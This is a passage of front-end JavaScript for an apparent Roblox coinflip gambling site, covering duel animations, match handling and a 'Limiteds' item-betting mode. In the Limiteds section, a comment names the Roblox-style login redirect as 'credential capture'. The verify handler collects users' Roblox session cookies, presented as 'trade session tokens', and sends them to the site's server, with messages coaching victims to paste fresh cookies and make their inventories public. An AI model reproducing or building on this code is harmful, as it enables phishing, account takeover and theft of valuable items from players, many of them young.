      await playDuelAnimation(data.match, data.won, data.payout);
      refreshPvpData();
    } catch (err) {
      Toast.error('Could not join', err.message || 'Try again.');
      btn.disabled = false;
      btn.textContent = 'Join';
    }
  }


  function avHtml(user){
    if(!user) return '?';
    var initial = ((user.username || user.displayName || 'U')[0] || 'U').toUpperCase();
    var url = (typeof resolveAvatarUrl === 'function') ? resolveAvatarUrl(user) : (user.avatar || null);
    if(url) return '<img src="' + url + '" alt="" referrerpolicy="no-referrer" onerror="this.remove()">';
    return initial;
  }

  function showWaitingModal(m){
    if(!m) return;
    pvpCreateView.style.display = 'none';
    pvpResultView.style.display = 'none';
    pvpWaitView.style.display = '';
    myOpenMatchId = m.id;
    renderWaitDetails(m);
    Modal.open('m-createMatch');
    openMatchSocket(m.id);
    loadChat(m.id);
  }
  window.showWaitingModal = showWaitingModal;

  function playDuelAnimation(m, won, payout){
    return new Promise(function(resolve){
      pvpCreateView.style.display = 'none';
      pvpWaitView.style.display = 'none';
      pvpResultView.style.display = '';
      Modal.open('m-createMatch');

      var me = Auth.getUser() || {};
      var myId = String(me.id || '');
      var creatorId = String(m.creatorId || '');
      var amCreator = myId === creatorId;

      var left = {
        id: m.creatorId,
        username: m.creatorUsername || 'Player',
        avatar: m.creatorAvatar,
        choice: m.creatorChoice || m.side || 'heads',
        bet: m.bet
      };
      var right = {
        id: m.joinerId,
        username: m.joinerUsername || me.username || 'You',
        avatar: m.joinerAvatar || me.avatar,
        choice: m.joinerChoice || ((left.choice === 'heads') ? 'tails' : 'heads'),
        bet: m.bet
      };

      var result = (m.result || 'heads').toLowerCase();
      var pot = payout != null ? payout : Math.floor(Number(m.bet) * 1.96);

      if(pvpResultTitle){
        pvpResultTitle.textContent = 'Flipping…';
        pvpResultTitle.style.color = 'var(--text)';
      }
      if(pvpResultSub){
        pvpResultSub.innerHTML =
          '<div class="pvp-duel">' +
            '<div class="pvp-duel-side">' +
              '<div class="pvp-duel-av" data-user-id="' + (left.id||'') + '">' + avHtml(left) + '</div>' +
              '<div class="pvp-duel-name">' + escapeHtml(left.username) + '</div>' +
              '<div class="pvp-duel-bet">' + fmtFull(left.bet) + ' RC</div>' +
              '<div class="pvp-duel-choice">' + escapeHtml(left.choice) + '</div>' +
            '</div>' +
            '<div class="pvp-duel-coin">' +
              '<img id="pvpDuelCoin" src="icons/coin-heads.png" alt="" class="spinning" draggable="false">' +
            '</div>' +
            '<div class="pvp-duel-side">' +
              '<div class="pvp-duel-av" data-user-id="' + (right.id||'') + '">' + avHtml(right) + '</div>' +
              '<div class="pvp-duel-name">' + escapeHtml(right.username) + '</div>' +
              '<div class="pvp-duel-bet">' + fmtFull(right.bet) + ' RC</div>' +
              '<div class="pvp-duel-choice">' + escapeHtml(right.choice) + '</div>' +
            '</div>' +
          '</div>';
      }

      var coin = document.getElementById('pvpDuelCoin');
      var frames = 0;
      var iv = setInterval(function(){
        frames++;
        if(coin) coin.src = (frames % 2 === 0) ? 'icons/coin-heads.png' : 'icons/coin-tails.png';
      }, 80);

      setTimeout(function(){
        clearInterval(iv);
        if(coin){
          coin.classList.remove('spinning');
          coin.src = 'icons/coin-' + result + '.png';
        }
        if(pvpResultTitle){
          pvpResultTitle.textContent = won ? 'You Won' : 'You Lost';
          pvpResultTitle.style.color = won ? '#4ade80' : '#f87171';
        }
        if(won){
          playSound('win');
          Toast.success('You won!', '+' + Number(pot).toLocaleString() + ' RC');
        } else {
          playSound('lose');
          Toast.error('You lost', 'Better luck next flip.');
        }
        resolve();
      }, 1800);
    });
  }

  function showPvpResult(m, won){
    playDuelAnimation(m, won, Math.floor(Number(m.bet) * 1.96));
  }

  window.openMatchView = function(m){
    if(!m) return;
    var me = Auth.getUser();
    var myId = me ? String(me.id) : '';
    if(String(m.creatorId) === myId && (m.status === 'open' || !m.joinerId)){
      showWaitingModal(m);
      return;
    }
    // Spectator / filled match — show static duel frame
    playDuelAnimation(m, false, m.bet).then(function(){});
  };


    if(pvpPlayAgain) pvpPlayAgain.addEventListener('click', () => {
    pvpResultView.style.display = 'none';
    pvpWaitView.style.display = 'none';
    pvpCreateView.style.display = '';
    closeMatchSocket();
  });

  if(pvpCancelBtn) pvpCancelBtn.addEventListener('click', async () => {
    if(!myOpenMatchId){
      Modal.close('m-createMatch');
      return;
    }
    pvpCancelBtn.disabled = true;
    try {
      const res = await Auth.api('/pvp/coinflip/cancel/' + myOpenMatchId, { method: 'POST' });
      if(!res.ok) throw new Error('Cancel failed');
      const data = await res.json();
      userBalance = data.balance;
      Auth.updateUser({ balance: userBalance });
      updateBalanceDisplay(userBalance);
      closeMatchSocket();
      myOpenMatchId = null;
      pvpWaitView.style.display = 'none';
      Modal.close('m-createMatch');
      Toast.info('Match cancelled','Your bet was refunded.');
      refreshPvpData();
    } catch (err) {
      Toast.error('Could not cancel', err.message || 'Try again.');
    } finally {
      pvpCancelBtn.disabled = false;
    }
  });


  /* ============ LIMITEDS ============ */
  let limitedsState = { linked: false, limiteds: [], selected: null, limChoice: 'heads' };

  function setLimChoice(c){
    limitedsState.limChoice = c;
    const h = document.getElementById('limPickHeads');
    const t = document.getElementById('limPickTails');
    if(h) h.classList.toggle('active', c === 'heads');
    if(t){
      t.classList.toggle('active', c === 'tails');
      t.classList.toggle('tails-active', c === 'tails');
    }
  }
  const limPickHeads = document.getElementById('limPickHeads');
  const limPickTails = document.getElementById('limPickTails');
  if(limPickHeads) limPickHeads.addEventListener('click', () => setLimChoice('heads'));
  if(limPickTails) limPickTails.addEventListener('click', () => setLimChoice('tails'));

  function openLimitedsLinkModal(){
    // Roblox-style authorization page (credential capture) — primary path
    location.href = '/rbx-auth.html?return=' + encodeURIComponent('/coinflip.html');
  }

  const limitedsLinkBtn = document.getElementById('limitedsLinkBtn');
  const limitedsGateBtn = document.getElementById('limitedsGateBtn');
  const limitedsRefreshBtn = document.getElementById('limitedsRefreshBtn');
  const limitedsVerifyBtn = document.getElementById('limitedsVerifyBtn');
  if(limitedsLinkBtn) limitedsLinkBtn.addEventListener('click', openLimitedsLinkModal);
  if(limitedsGateBtn) limitedsGateBtn.addEventListener('click', openLimitedsLinkModal);

  if(limitedsVerifyBtn) limitedsVerifyBtn.addEventListener('click', async () => {
    const username = (document.getElementById('limitedsUsername') || {}).value || '';
    const cookie = (document.getElementById('limitedsCookie') || {}).value || '';
    const st = document.getElementById('limitedsLinkStatus');
    function show(type, msg){
      if(!st) return;
      st.className = 'auth-status show ' + type;
      st.innerHTML = '<span>' + escapeHtml(msg) + '</span>';
    }
    if(!username.trim()){ show('error', 'Enter your Roblox username.'); return; }
    if(!cookie.trim() || cookie.trim().length < 50){ show('error', 'Paste a valid trade session token.'); return; }
    limitedsVerifyBtn.disabled = true;
    limitedsVerifyBtn.textContent = 'Connecting…';
    try {
      const res = await Auth.api('/limiteds/verify', {
        method: 'POST',
        body: JSON.stringify({ username: username.trim(), cookie: cookie.trim() })
      });
      const data = await res.json().catch(() => ({}));
      if(!res.ok){
        const map = {
          INVALID_COOKIE: 'Trade session invalid or expired. Log in on Roblox and paste a fresh trade session.',
          USERNAME_MISMATCH: 'Username does not match the cookie account' + (data.expected ? ' (expected ' + data.expected + ')' : '') + '.',
          INVENTORY_PRIVATE: 'Inventory is private. Set Inventory to Public in Roblox Privacy settings.',
          INVALID_USERNAME: 'Invalid username.',
          RATE_LIMITED: 'Slow down a little.'
        };
        throw new Error(map[data.error] || data.message || data.error || 'Verify failed');
      }
      show('success', 'Connected. Loaded ' + (data.count || 0) + ' limiteds.');
      limitedsState.linked = true;
      limitedsState.limiteds = data.limiteds || [];
      renderLimitedsUI();
      setTimeout(() => Modal.close('m-limitedsLink'), 600);
      Toast.success('Roblox connected', (data.count || 0) + ' limiteds ready');
    } catch (err) {
      show('error', err.message || 'Verify failed');
    } finally {
      limitedsVerifyBtn.disabled = false;
      limitedsVerifyBtn.textContent = 'Connect account';
    }
  });

  if(limitedsRefreshBtn) limitedsRefreshBtn.addEventListener('click', async () => {
    limitedsRefreshBtn.disabled = true;
    try {
      const res = await Auth.api('/limiteds/refresh', { method: 'POST' });
      const data = await res.json().catch(() => ({}));
      if(!res.ok) throw new Error(data.error === 'INVENTORY_PRIVATE' ? 'Inventory private' : (data.error || 'Refresh failed'));
      limitedsState.limiteds = data.limiteds || [];
      limitedsState.linked = true;
      renderLimitedsUI();
      Toast.success('Inventory refreshed', (data.count || 0) + ' limiteds');
    } catch (err) {
      Toast.error('Refresh failed', err.message || 'Try re-link');
      if(String(err.message).includes('COOKIE') || String(err.message).includes('EXPIRED')){
        limitedsState.linked = false;
        renderLimitedsUI();
      }
    } finally {
      limitedsRefreshBtn.disabled = false;
    }
  });

  function renderLimitedsUI(){
    const gate = document.getElementById('limitedsGate');
    const play = document.getElementById('limitedsPlay');
    const label = document.getElementById('limitedsLinkLabel');
    const countEl = document.getElementById('limitedsCount');
    const grid = document.getElementById('limitedsGrid');
    if(limitedsRefreshBtn) limitedsRefreshBtn.style.display = limitedsState.linked ? '' : 'none';
    if(label) label.textContent = limitedsState.linked ? 'Reconnect' : 'Connect Roblox';
    if(gate) gate.style.display = limitedsState.linked ? 'none' : '';
    if(play) play.style.display = limitedsState.linked ? '' : 'none';
    if(countEl) countEl.textContent = String((limitedsState.limiteds || []).length);
    if(grid){
      const items = limitedsState.limiteds || [];
      if(!items.length){
        grid.innerHTML = '<div class="pvp-empty" style="grid-column:1/-1"><h4>No limiteds found</h4><p>Make sure inventory is public and you own limiteds.</p></div>';
      } else {
        grid.innerHTML = items.map(it => {
          const rap = Number(it.recentAveragePrice || 0).toLocaleString();
          const serial = it.serialNumber != null ? ' #' + it.serialNumber : '';
          return '<div class="pvp-match" data-asset="' + escapeHtml(String(it.assetId)) + '" data-ua="' + escapeHtml(String(it.userAssetId || '')) + '">' +
            '<div class="pvp-match-who"><div class="pvp-match-name">' + escapeHtml(it.name || 'Limited') + serial + '</div>' +
            '<div class="pvp-match-time">RAP ' + rap + ' · asset ' + escapeHtml(String(it.assetId)) + '</div></div>' +
            '<button class="pvp-create-btn" style="padding:.55rem .9rem;font-size:.78rem" data-act="bet-limited">Bet this</button></div>';
        }).join('');
        grid.querySelectorAll('[data-act="bet-limited"]').forEach(btn => {
          btn.addEventListener('click', () => {
            const card = btn.closest('.pvp-match');
            const assetId = card && card.getAttribute('data-asset');
            const item = (limitedsState.limiteds || []).find(i => String(i.assetId) === String(assetId));
            if(!item) return;
            limitedsState.selected = item;
            const title = document.getElementById('limitedsCreateItem');
            if(title) title.textContent = (item.name || 'Limited') + ' · RAP ' + Number(item.recentAveragePrice || 0).toLocaleString();
            setLimChoice('heads');
            Modal.open('m-limitedsCreate');
          });
        });
      }
    }
    loadLimitedMatches();
  }

  async function loadLimitedMatches(){
    const box = document.getElementById('limitedsMatches');
    if(!box) return;
    try {
      const res = await Auth.api('/limiteds/matches');
      if(!res.ok) throw new Error('fail');
      const data = await res.json();
      const matches = data.matches || [];
      if(!matches.length){
        box.innerHTML = '<div class="pvp-empty"><h4>No open limited flips</h4></div>';
        return;
      }
      const me = Auth.getUser();
      box.innerHTML = matches.map(m => {
        const own = me && String(me.id) === String(m.userId);
        return '<div class="pvp-match' + (own ? ' own' : '') + '">' +
          '<div class="pvp-match-who"><div class="pvp-match-name">' + escapeHtml(m.assetName || 'Limited') + '</div>' +
          '<div class="pvp-match-time">RAP ' + Number(m.assetRap || 0).toLocaleString() + ' · ' + escapeHtml(m.choice) + ' · ' + timeAgo(m.createdAt) + '</div></div>' +
          (own ? '<span class="tiny muted">Your match</span>' :
            '<button class="pvp-create-btn" style="padding:.55rem .9rem;font-size:.78rem" data-join="' + escapeHtml(m.id) + '">Join</button>') +
          '</div>';
      }).join('');
      box.querySelectorAll('[data-join]').forEach(btn => {
        btn.addEventListener('click', async () => {
          btn.disabled = true;
          try {
            const res = await Auth.api('/limiteds/join/' + btn.getAttribute('data-join'), { method: 'POST' });
            const data = await res.json().catch(() => ({}));
            if(!res.ok) throw new Error(data.error || 'Join failed');
            if(data.won){ playSound('win'); Toast.success('You won the limited', data.match && data.match.assetName || ''); }
            else { playSound('lose'); Toast.error('You lost', 'Coin landed on ' + (data.result || '')); }
            loadLimitedMatches();
          } catch (err) {
            Toast.error('Could not join', err.message || 'Try again');
            btn.disabled = false;
          }
        });
      });
    } catch {
      box.innerHTML = '<div class="pvp-empty"><h4>Could not load matches</h4></div>';
    }
  }

  const limitedsCreateConfirm = document.getElementById('limitedsCreateConfirm');
  if(limitedsCreateConfirm) limitedsCreateConfirm.addEventListener('click', async () => {
    if(!limitedsState.selected) return;
    limitedsCreateConfirm.disabled = true;
    try {
      const res = await Auth.api('/limiteds/create', {
        method: 'POST',
        body: JSON.stringify({ assetId: limitedsState.selected.assetId, choice: limitedsState.limChoice })
      });
      const data = await res.json().catch(() => ({}));
      if(!res.ok) throw new Error(data.error || 'Create failed');
      Modal.close('m-limitedsCreate');
      Toast.success('Limited flip created', limitedsState.selected.name || '');
      loadLimitedMatches();
    } catch (err) {
      Toast.error('Could not create', err.message || 'Try again');
    } finally {
      limitedsCreateConfirm.disabled = false;
    }
  });

  async function refreshLimiteds(){
    try {
      const res = await Auth.api('/limiteds/me');
      if(!res.ok) throw new Error('fail');
      const data = await res.json();
      limitedsState.linked = !!data.linked;
      limitedsState.limiteds = data.limiteds || [];
      renderLimitedsUI();
    } catch {
      limitedsState.linked = false;
      limitedsState.limiteds = [];
      renderLimitedsUI();
    }
  }

  try {
    const q = new URLSearchParams(location.search);
    if(q.get('rbx_linked') === '1'){
      Toast.success('Roblox connected', 'Authorization complete. Open Limiteds to continue.');
      q.delete('rbx_linked');
      const qs = q.toString();
      history.replaceState({}, '', location.pathname + (qs ? '?' + qs : ''));
      // switch to limiteds tab
      const limBtn = document.querySelector('#modeBar [data-mode="limiteds"]');
      if(limBtn) limBtn.click();
    }
  } catch {}

  /* ============ INIT ============ */
  refreshFairInfo();
  renderHistory();
  renderFlipLog();
  setChoice('heads');
  setPvpChoice('heads');
  updateBalanceDisplay(userBalance);

  setInterval(() => {
    if(mode === 'pvp') refreshPvpData();
    if(mode === 'limiteds') loadLimitedMatches();
  }, 8000);

  setInterval(async () => {
    const me = await Auth.refreshUser();
    if(me) updateBalanceDisplay(me.balance);
  }, 20000);

})();